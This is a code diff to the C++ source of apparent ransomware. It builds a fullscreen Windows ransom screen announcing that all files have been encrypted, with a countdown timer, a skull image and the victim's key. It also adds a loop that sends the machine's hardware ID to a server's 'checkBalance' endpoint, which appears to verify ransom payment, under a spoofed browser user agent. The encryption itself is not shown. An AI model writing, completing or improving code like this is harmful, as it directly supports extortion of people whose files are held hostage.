@@ -1,15 +1,17 @@
 #include "MXGui.h"
 #include "static.h"
+#include "http.h"
 #include <Windows.h>
-
+#include <cstdlib>
 MXGui::MXGui(const std::string& pubKey) {
     setWidthHeight();
-    skull = new Fl_PNG_Image("Q2lyaXVzIGlzIGNvbWluZw==", rawData, sizeof(rawData));
+    skull = new Fl_PNG_Image("Gürü", rawData, sizeof(rawData));
     window = new Fl_Window(width, height, "");
     label = new Fl_Box(0, height / 2.25, width, 30);
     message = new Fl_Box(0, height / 2, width, 30);
     this->pubKey = new Fl_Box(0, height / 1.85, width, 30);
     time = new Fl_Box(0, height / 1.60, width, 30);
+    box = new Fl_Box((width - 256) / 2, height / 10, 256, 256);
     timeRemaining = new Fl_Box(0, height / 1.30, width, 30);
 
     label->label("ALL YOUR FILES HAVE BEEN ENCRYPTED !");
@@ -40,12 +42,14 @@ MXGui::MXGui(const std::string& pubKey) {
     time->labelfont(FL_BOLD);
     time->labelsize(28);
 
-    timeRemaining->label("Time remaining : ");
+    timeRemaining->label("12:00:00");
     timeRemaining->align(FL_ALIGN_CENTER);
     timeRemaining->color(FL_BLACK);
     timeRemaining->labelcolor(FL_WHITE);
     timeRemaining->labelfont(FL_BOLD);
-    timeRemaining->labelsize(28);
+    timeRemaining->labelsize(72);
+
+    box->image(skull);
 
     window->add(label);
     window->color(FL_BLACK);
@@ -74,4 +78,28 @@ void MXGui::setWidthHeight() {
     height = GetSystemMetrics(SM_CYSCREEN);
     width = GetSystemMetrics(SM_CXSCREEN);	
 }
+
+void MXGui::isEnterPress() {
+    Http http(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
+	extern std::string hwId;
+    int i = 0;
+    while (true) {
+        if (GetAsyncKeyState(VK_RETURN) == 0x8000) {
+            std::string aes = http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=checkBalance", L"Content-Type: application/x-www-form-urlencoded\r\n", "uuid=" + hwId);
+            i++;
+            MessageBoxA(NULL, aes.c_str(), " Balance", MB_OK);
+        }
+
+	}
+}
+
+
+
+
+
+
+
+
+
+
 
